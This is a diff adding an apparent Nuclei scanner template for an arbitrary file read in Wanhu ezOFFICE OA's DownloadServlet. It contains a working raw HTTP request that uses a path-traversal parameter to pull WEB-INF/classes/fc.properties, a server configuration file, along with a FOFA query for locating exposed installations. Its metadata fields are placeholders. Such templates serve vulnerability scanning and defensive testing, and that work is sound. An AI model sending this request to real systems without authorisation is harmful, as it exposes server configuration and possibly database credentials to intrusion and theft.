@@ -1,0 +1,36 @@
+id: WanHuOA-DownloadServlet-FileRead
+
+info:
+  name: 万户OA-DownloadServlet-任意文件读取漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata: 
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /defaultroot/DownloadServlet?FileName=WEB-INF%2Fclasses%2Ffc.properties&cd=&downloadAll=2&encrypt=x&key=x&modeType=0&name=x&path=.. HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: JSESSIONID=T4vHl5tH1KcWLLT1LcGpJtd7xkTQM5P90T5k5BSlhZQJTnnltT11!161638068
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - driver
+      - type: status
+        status:
+          - 200
